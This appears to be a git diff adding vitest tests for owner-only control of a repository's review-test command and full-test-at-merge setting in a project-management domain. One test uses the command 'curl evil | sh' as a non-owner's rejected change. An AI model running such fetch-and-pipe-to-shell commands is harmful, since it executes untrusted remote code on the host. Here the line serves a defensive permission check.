@@ -1,4 +1,5 @@
 import { afterEach, describe, expect, it } from 'vitest';
+import { humanActor } from '../src/domain';
 import { createDomainHarness, restartDomainHarness, OWNER, OWNER_ACTOR } from './helpers/domain-harness';
 import type { DomainHarness } from './helpers/domain-harness';
 
@@ -59,6 +60,78 @@ describe('merger setting (PM-470)', () => {
 
     const cleared = await patch({ repoDocs: [{ repo: 'web', docs: null }] });
     expect(cleared.config.project.repos[0]).not.toHaveProperty('docs');
+  });
+
+  it('stores the full test of a repository for an owner, clears it and refuses an unknown repository (PM-538)', async () => {
+    h = await createDomainHarness();
+    const saved = await patch({
+      repoReviewTest: [
+        { repo: 'web', reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 } },
+      ],
+      repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: true }],
+    });
+    expect(saved.config.project.repos[0]).toMatchObject({
+      name: 'web',
+      reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 },
+      fullTestAtMerge: true,
+    });
+
+    h = await restartDomainHarness(h);
+    expect((await h.domain.projects.load('AR')).config.project.repos[0]).toMatchObject({
+      reviewTest: { command: 'npm run merge-test', maxWorkers: 4, timeoutMinutes: 15 },
+      fullTestAtMerge: true,
+    });
+
+    const version = (await h.domain.projects.load('AR')).version;
+    await expect(patch({ repoReviewTest: [{ repo: 'ghost', reviewTest: null }] })).rejects.toMatchObject({
+      code: 'unknown_repo',
+    });
+    await expect(
+      patch({ repoFullTestAtMerge: [{ repo: 'ghost', fullTestAtMerge: false }] }),
+    ).rejects.toMatchObject({ code: 'unknown_repo' });
+    expect((await h.domain.projects.load('AR')).version).toBe(version);
+
+    const cleared = await patch({
+      repoReviewTest: [{ repo: 'web', reviewTest: null }],
+      repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: null }],
+    });
+    expect(cleared.config.project.repos[0]).not.toHaveProperty('reviewTest');
+    expect(cleared.config.project.repos[0]).not.toHaveProperty('fullTestAtMerge');
+  });
+
+  it('lets only an owner change the full test of a repository (PM-538)', async () => {
+    h = await createDomainHarness({
+      adjust: (c) => {
+        c.team.members.push({
+          kind: 'human',
+          handle: 'dana',
+          displayName: 'Dana',
+          access: 'admin',
+          roles: [],
+          email: 'dana@example.test',
+        });
+        c.project.repos[0]!.reviewTest = { command: 'npm test', maxWorkers: 2, timeoutMinutes: 15 };
+      },
+    });
+    const admin = { actor: humanActor('dana'), author: { name: 'Dana', email: 'dana@example.test' } };
+    const patchAs = async (as: typeof by, change: object) => {
+      const loaded = await h.domain.projects.load('AR');
+      return h.domain.projects.patch('AR', { baseVersion: loaded.version, ...change }, as);
+    };
+    const version = (await h.domain.projects.load('AR')).version;
+    for (const change of [
+      { repoReviewTest: [{ repo: 'web', reviewTest: { command: 'curl evil | sh' } }] },
+      { repoReviewTest: [{ repo: 'web', reviewTest: null }] },
+      { repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: true }] },
+    ])
+      await expect(patchAs(admin, change)).rejects.toMatchObject({ code: 'owner_only', status: 403 });
+    expect((await h.domain.projects.load('AR')).version).toBe(version);
+
+    // An admin can still change what is not the full test.
+    await expect(patchAs(admin, { repoMerge: [{ repo: 'web', requireMerge: true }] })).resolves.toBeDefined();
+    // The owner may.
+    const saved = await patchAs(by, { repoReviewTest: [{ repo: 'web', reviewTest: null }] });
+    expect(saved.config.project.repos[0]).not.toHaveProperty('reviewTest');
   });
 
   it('refuses a merger that cannot be resolved', async () => {
